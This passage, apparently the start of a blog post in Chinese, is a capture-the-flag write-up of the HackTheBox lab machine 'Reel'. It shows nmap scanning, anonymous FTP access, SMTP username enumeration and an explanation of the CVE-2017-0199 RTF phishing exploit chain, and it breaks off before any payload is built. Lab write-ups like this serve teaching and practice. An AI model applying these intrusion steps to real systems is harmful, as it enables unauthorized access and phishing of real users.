@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang='en'>
+
+<head>
+  <meta name="generator" content="Hexo 5.4.0">
+  <meta charset="utf-8">
+  
+
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  <link rel='dns-prefetch' href='https://cdn.jsdelivr.net'>
+  <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
+
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  <title>HTB: Reel - T0x1c</title>
+
+  
+    <meta name="description" content="Reel是一个困难的靶机，知识点涉及smtp用户名枚举、rtf邮件钓鱼、xml凭据恢复、管理员组添加等。使用rtf邮件钓鱼可以获取权限，接下来通过凭据恢复、csv信息收集以及管理员组添加等方式提权多个用户，最终拿到管理员密码。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB: Reel">
+<meta property="og:url" content="https://toxic80l.github.io/post/960d5b61/index.html">
+<meta property="og:site_name" content="T0x1c">
+<meta property="og:description" content="Reel是一个困难的靶机，知识点涉及smtp用户名枚举、rtf邮件钓鱼、xml凭据恢复、管理员组添加等。使用rtf邮件钓鱼可以获取权限，接下来通过凭据恢复、csv信息收集以及管理员组添加等方式提权多个用户，最终拿到管理员密码。感兴趣的同学可以在HackTheBox中进行学习。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0260.gif">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.05.51.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8810.14.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8811.30.37.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8811.33.46.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8811.34.18.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%882.30.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%884.05.31.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%884.00.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%884.54.17.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%8811.36.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%889.58.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%8811.42.40.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%8812.25.25.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%8812.27.49.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%8812.38.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.31.03.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.19.05.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.32.26.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.33.34.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.41.06.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.46.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.48.42.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.54.04.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.56.45.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.59.20.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.01.14.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.02.53.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.13.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.18.15.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.21.24.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.57.28.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.48.36.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.54.38.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.57.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.58.41.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.37.11.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.37.32.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.37.57.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.39.13.png">
+<meta property="og:image" content="https://toxic80l.github.io/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.44.25.png">
+<meta property="article:published_time" content="2022-02-15T01:58:19.000Z">
+<meta property="article:modified_time" content="2022-02-15T08:13:49.654Z">
+<meta property="article:author" content="toxic80L">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="BloodHound">
+<meta property="article:tag" content="smtp">
+<meta property="article:tag" content="rtf">
+<meta property="article:tag" content="xml">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0260.gif">
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+</head>
+
+<body>
+  
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+
+<header class="header">
+
+<div class="logo-wrap"><a class="avatar" href="/medias/avatar.png"><div class="bg" style="opacity:0;background-image:url(https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.2/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.png" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></a><a class="title" href="/"><div class="main">T0x1c</div><div class="sub cap">我在听你的独家记忆</div></a></div>
+<nav class="menu dis-select"><a class="nav-item active" href="/">Blog</a><a class="nav-item" href="/wiki/">Wiki</a><a class="nav-item" href="/notes/">notes</a><a class="nav-item" href="/friends/">more</a></nav></header>
+
+<div class="widgets">
+
+<div class="widget-wrap single" id="toc"><div class="widget-header cap dis-select"><span class="name">TOC</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E4%BE%A6%E6%9F%A5"><span class="toc-text">0x01 侦查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-text">端口探测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#21%E7%AB%AF%E5%8F%A3"><span class="toc-text">21端口</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">ftp信息收集</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E4%B8%8A%E7%BA%BF-nico"><span class="toc-text">0x02 上线[nico]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smtp%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE"><span class="toc-text">smtp用户枚举</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="toc-text">手动枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="toc-text">自动枚举</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#rtf%E7%BD%91%E7%BB%9C%E9%92%93%E9%B1%BC"><span class="toc-text">rtf网络钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8Fhta%E6%96%87%E4%BB%B6"><span class="toc-text">生成恶意hta文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%9F%E6%88%90%E8%AF%B7%E6%B1%82%E6%81%B6%E6%84%8Fhta%E7%9A%84rtf%E6%96%87%E4%BB%B6"><span class="toc-text">生成请求恶意hta的rtf文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E8%8E%B7%E5%8F%96%E6%9D%83%E9%99%90"><span class="toc-text">发送邮件获取权限</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-text">msf自动化利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E4%B8%8A%E7%BA%BF-tom"><span class="toc-text">0x03 上线[tom]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%AD%E6%8D%AE%E6%81%A2%E5%A4%8D"><span class="toc-text">凭据恢复</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E9%99%86tom"><span class="toc-text">ssh登陆tom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#csv%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">csv信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BloodHound%E8%A1%A8%E6%A0%BC%E5%88%86%E6%9E%90"><span class="toc-text">BloodHound表格分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-%E4%B8%8A%E7%BA%BF-claire"><span class="toc-text">0x04 上线[claire]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9claire%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-text">修改claire用户密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E9%99%86claire"><span class="toc-text">ssh登陆claire</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05-%E4%B8%8A%E7%BA%BF-administrator"><span class="toc-text">0x05 上线[administrator]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E7%AE%A1%E7%90%86%E5%91%98%E6%A1%8C%E9%9D%A2%E6%9D%83%E9%99%90"><span class="toc-text">查看管理员桌面权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81"><span class="toc-text">查找登陆密码</span></a></li></ol></li></ol></div></div></div>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/toxic80L" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.3/social/08a41b181ce68.svg"/></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+
+<div class="bread-nav fs12"><div id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a><span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/HackTheBox/">HackTheBox</a></div><div id="post-meta">Posted on&nbsp;<time datetime="2022-02-15T01:58:19.000Z">2022-02-15</time></div></div>
+
+<article class='content md post'>
+<h1 class="article-title"><span>HTB: Reel</span></h1>
+<p>Reel是一个困难的靶机，知识点涉及smtp用户名枚举、rtf邮件钓鱼、xml凭据恢复、管理员组添加等。使用rtf邮件钓鱼可以获取权限，接下来通过凭据恢复、csv信息收集以及管理员组添加等方式提权多个用户，最终拿到管理员密码。感兴趣的同学可以在HackTheBox中进行学习。</p>
+<span id="more"></span>
+<span class="tag-plugin emoji"><img no-lazy class="inline" src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/aru-l/0260.gif" style="height:3em" onerror="javascript:this.classList.add('error');this.src='https://cdn.jsdelivr.net/gh/cdn-x/placeholder@1.0.1/image/2659360.svg';"></span>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%882.05.51.png" alt="截屏2021-11-08 上午2.05.51"></p>
+<h2 id="0x01-侦查"><a href="#0x01-侦查" class="headerlink" title="0x01 侦查"></a>0x01 侦查</h2><h3 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h3><p>首先通过nmap对目标进行端口扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -p- -sV -sC -A 10.10.10.77 -oA nmap_Reel</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8810.14.13.png" alt="截屏2021-11-08 上午10.14.13"><br>扫描结果显示开放了21、22、25端口</p>
+<h4 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h4><p>在扫描结果中目标发现存在 ftp 匿名登录漏洞，尝试登陆 ftp </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.10.77</span><br><span class="line"><span class="comment">## 账号/密码：anonymous/anonymous</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8811.30.37.png" alt="截屏2021-11-08 上午11.30.37"><br>成功登录</p>
+<h3 id="ftp信息收集"><a href="#ftp信息收集" class="headerlink" title="ftp信息收集"></a>ftp信息收集</h3><p>进入<code>documents</code>目录并下载该目录中的所有文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp &gt; <span class="built_in">cd</span> documents</span><br><span class="line">ftp &gt; ls</span><br><span class="line">ftp &gt; get readme.txt</span><br><span class="line">ftp &gt; get AppLocker.docx</span><br><span class="line">ftp &gt; get <span class="string">&quot;Windows Event Forwarding.docx&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8811.33.46.png" alt="截屏2021-11-08 上午11.33.46"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8A%E5%8D%8811.34.18.png" alt="截屏2021-11-08 上午11.34.18"><br>查看已下载三个文件内容但未发现可利用点</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">AppLocker.docx：要记录的</span> <span class="string">AppLocker</span> <span class="string">程序</span> <span class="bullet">-</span> <span class="string">exe、msi</span> <span class="string">和脚本（ps1、vbs、cmd、bat、js）的哈希规则有效。</span></span><br><span class="line"><span class="string">readme.txt：请给我发电子邮件任何</span> <span class="string">rtf</span> <span class="string">格式程序</span> <span class="bullet">-</span> <span class="string">我会审查和转换。新格式/转换后的文件将保存在这里。</span></span><br><span class="line"><span class="string">Windows</span> <span class="string">Event</span> <span class="string">Forwarding.docx：记录了日志转发命令</span></span><br></pre></td></tr></table></figure>
+<p>使用 exiftool 查看它们的元数据，在文档<code>Windows Event Forwarding.docx</code>中发现了一个邮箱<code>nico@megabank.com</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool <span class="string">&quot;Windows Event Forwarding.docx&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%882.30.45.png" alt="截屏2021-11-08 下午2.30.45"></p>
+<h2 id="0x02-上线-nico"><a href="#0x02-上线-nico" class="headerlink" title="0x02 上线[nico]"></a>0x02 上线[nico]</h2><h3 id="smtp用户枚举"><a href="#smtp用户枚举" class="headerlink" title="smtp用户枚举"></a>smtp用户枚举</h3><p>一般情况下枚举 smtp 用户存在以下三种模式</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">VERY：验证邮箱是否存在</span></span><br><span class="line"><span class="string">EXPN：验证邮箱列表是否存在</span></span><br><span class="line"><span class="string">RCPT</span> <span class="string">TO：指定收件人地址</span></span><br></pre></td></tr></table></figure>
+<h4 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h4><p>首先使用在 ftp 中发现的账户<code>nico@megabank.com</code>进行验证</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">telnet 10.10.10.77 25</span><br><span class="line">&gt; HELO</span><br><span class="line">&gt; HELO mac</span><br><span class="line">&gt; VRFY nico@megabank.com</span><br><span class="line">&gt; EXPN nico@megabank.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%884.05.31.png" alt="截屏2021-11-08 下午4.05.31"><br>在使用<code>vrfy</code>、<code>expn</code>命令验证时显示该用户不存在，但在使用<code>rcpt to</code>验证时显示该用户存在</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; mali from a@abc.com</span><br><span class="line">&gt; rcpt to:nico@megabank.com</span><br><span class="line">&gt; rcpt to:root@aaa.com</span><br><span class="line">&gt; rcpt to:a@megabank.com</span><br><span class="line">&gt; rcpt to:root@megabank.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%884.00.17.png" alt="截屏2021-11-08 下午4.00.17"></p>
+<h4 id="自动枚举"><a href="#自动枚举" class="headerlink" title="自动枚举"></a>自动枚举</h4><p>为了方便起见，我们使用<code>smtp-user-enum</code>来对<code>nico</code>、<code>@htb</code>、<code>@megabank</code>进行测试，构造字典<code>user.txt</code>如下</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">reel</span></span><br><span class="line"><span class="string">administrator</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">root</span></span><br><span class="line"><span class="string">reel@htb</span></span><br><span class="line"><span class="string">reel@htb.local</span></span><br><span class="line"><span class="string">reel@reel.htb</span></span><br><span class="line"><span class="string">administrator@htb</span></span><br><span class="line"><span class="string">admin@htb</span></span><br><span class="line"><span class="string">root@htb</span></span><br><span class="line"><span class="string">sadfasdfasdfasdf@htb</span></span><br><span class="line"><span class="string">nico@megabank.com</span></span><br><span class="line"><span class="number">0xdf</span><span class="string">@megabank.com</span></span><br><span class="line"><span class="string">htb@metabank.com</span></span><br></pre></td></tr></table></figure>
+<p>使用<code>smtp-user-enum</code>对 smtp 用户名自动枚举</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp-user-enum -M RCPT -U user.txt -t 10.10.10.77</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%884.54.17.png" alt="截屏2021-11-08 下午4.54.17"></p>
+<p>测试结果显示带有<code>@megabank.com</code>的用户只有<code>nico</code>存在，而带有<code>@htb</code>的用户都存在</p>
+<h3 id="rtf网络钓鱼"><a href="#rtf网络钓鱼" class="headerlink" title="rtf网络钓鱼"></a>rtf网络钓鱼</h3><p>在之前 ftp 中的<code>readme.txt</code>中说可以发送 rtf 格式程序，而 rtf 存在一个漏洞（CVE-2017-0199），MSF 中存在该漏洞的详情</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">在</span> <span class="string">MSF</span> <span class="string">中可直接调用相关模块，它会创建一个恶意的</span> <span class="string">rtf</span> <span class="string">文件，在易受攻击的</span> <span class="string">word</span> <span class="string">版本中打开该文件，将导致代码执行，它存在于</span> <span class="string">olelink</span> <span class="string">对象中，当用于打开文档时，winword.exe</span> <span class="string">会向远程服务器发送</span> <span class="string">http</span> <span class="string">请求，以检索恶意的</span> <span class="string">HTA</span> <span class="string">文件，当收到响应会是一个带有恶意脚本的假</span> <span class="string">rtf</span> <span class="string">文件，winword.exe</span> <span class="string">通过</span> <span class="string">COM</span> <span class="string">对象查找application/hta</span> <span class="string">的文件处理程序，这会导致</span> <span class="string">Microsoft</span> <span class="string">HTA</span> <span class="string">应用程序（mshta.exe）下载并执行包含</span> <span class="string">Powershell</span> <span class="string">命令</span> <span class="string">Visual</span> <span class="string">Basic</span> <span class="string">脚本。</span></span><br></pre></td></tr></table></figure>
+<p>我们可以利用该漏洞让用户打开恶意 rtf 文件，该文件对 hta 文件发出请求，hta 文件执行代码从而获取到目标权限。</p>
